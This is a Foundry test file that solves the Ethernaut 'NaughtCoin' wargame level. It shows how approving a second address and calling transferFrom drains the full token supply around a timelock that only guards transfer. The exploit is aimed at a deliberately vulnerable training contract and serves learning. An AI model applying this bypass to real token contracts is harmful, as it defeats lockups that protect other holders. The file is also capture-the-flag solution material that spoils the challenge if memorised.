// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/NaughtCoin.sol";

contract TestNaughtCoin is Test {
    NaughtCoin naughtCoin;

    address player = address(0x51);
    address attacker = address(0x52);

    function setUp() external {
        naughtCoin = new NaughtCoin(player);
    }

    function testExploit() external {
        vm.startPrank(player, player);
        naughtCoin.approve(attacker, naughtCoin.balanceOf(player));
        assertEq(naughtCoin.balanceOf(attacker), 0);
        vm.stopPrank();
        vm.startPrank(attacker);
        naughtCoin.transferFrom(player, attacker, naughtCoin.INITIAL_SUPPLY());
        assertEq(naughtCoin.balanceOf(player), 0);
        assertEq(naughtCoin.balanceOf(attacker), naughtCoin.INITIAL_SUPPLY());
    }
}
